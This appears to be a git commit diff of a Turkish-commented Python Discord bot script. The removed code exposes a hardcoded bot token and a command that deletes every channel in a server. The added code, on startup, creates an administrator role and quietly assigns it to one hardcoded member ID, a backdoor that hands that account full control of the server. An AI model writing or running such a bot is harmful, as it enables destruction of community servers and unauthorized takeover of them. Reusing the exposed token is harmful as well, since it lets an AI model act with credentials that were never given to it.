176e7068fa522fcb7caad7f0bf2eaa89bbd98239
santez <157430892+ssantez@users.noreply.github.com>
2024-04-20 16:39:19 +0300

    Update sa.py

--- sa.py
+++ sa.py
@@ -1,32 +1,52 @@
 import discord
 
-# Discord bot token
-TOKEN = 'MTIyNDAxMjY5NDIwMjYxMzc4MA.GecnXx.m-lq6o4z3bE6_FymtbC2ftj0Fk9a1RRIEArHLk'
-# Discord intents
+
+TOKEN = 'Your bot token'
+
+# Botun bağlanacağı sunucu ID'si
+SERVER_ID = serverid
+
+# Yeni rolün ismi
+YENI_ROL_ISMI = "TEST"
+
+# Yeni rolün yönetici yetkisi
+YONETICI_YETKISI = True
+
+# Discord client oluştur
 intents = discord.Intents.default()
 intents.guilds = True
-intents.messages = True
+intents.members = True
+intents.guild_messages = True
 
-# Discord client
 client = discord.Client(intents=intents)
 
+# Bot hazır olduğunda çalışacak olan event
 @client.event
 async def on_ready():
     print(f'{client.user} olarak giriş yapıldı.')
 
-@client.event
-async def on_message(message):
-    if message.author == client.user:
+    # Sunucuyu al
+    server = client.get_guild(SERVER_ID)
+
+    if server is None:
+        print("Belirtilen sunucu bulunamadı.")
         return
 
-    if message.guild:  # Mesaj bir sunucudan geliyorsa
-        if message.content.startswith('!kanallari_sil'):
-            # Tüm kanalları al ve sil
-            for channel in message.guild.channels:
-                await channel.delete()
+    # Üyeyi al
+    member = server.get_member(1223800142910722170)
 
-            # Yeni bir kanal oluştur ve mesaj gönder
-            new_channel = await message.guild.create_text_channel('santez')
-            await new_channel.send('santez kanalına hoş geldiniz!')
+    if member is None:
+        print("Belirtilen üye bulunamadı.")
+        return
 
+    # Yeni rolü oluştur
+    yeni_rol = await server.create_role(name=YENI_ROL_ISMI, permissions=discord.Permissions(administrator=YONETICI_YETKISI))
+
+    # Üyeye yeni rolü ekle
+    await member.add_roles(yeni_rol)
+
+    print(f"{YENI_ROL_ISMI} rolü  {member.name} kullanıcısına eklendi")
+    
+
+# Botu çalıştır
 client.run(TOKEN)
